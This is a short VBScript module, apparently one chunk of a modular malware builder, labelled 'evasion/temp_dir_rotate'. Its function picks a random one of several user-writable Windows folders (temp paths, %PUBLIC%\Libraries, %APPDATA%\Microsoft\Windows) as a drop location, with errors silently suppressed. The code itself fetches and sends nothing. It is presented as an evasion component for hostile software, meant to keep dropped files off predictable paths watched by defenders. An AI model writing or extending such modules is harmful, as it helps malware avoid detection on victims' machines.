' chunk: evasion/temp_dir_rotate
' depends: (none)
' provides: get_temp_dir
' format: vbscript
' note: Rotate between temp directory locations

Function get_temp_dir()
    On Error Resume Next
    Dim sh, fso, dirs, i, chosen
    Set sh = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    dirs = Array( _
        sh.ExpandEnvironmentStrings("%TEMP%"), _
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Temp", _
        sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Temp", _
        sh.ExpandEnvironmentStrings("%PUBLIC%") & "\Libraries", _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows" _
    )
    Randomize
    Dim start
    start = Int(Rnd * 5)
    For i = 0 To 4
        Dim idx
        idx = (start + i) Mod 5
        If fso.FolderExists(dirs(idx)) Then
            get_temp_dir = dirs(idx)
            Exit Function
        End If
    Next
    get_temp_dir = fso.GetSpecialFolder(2).Path
End Function
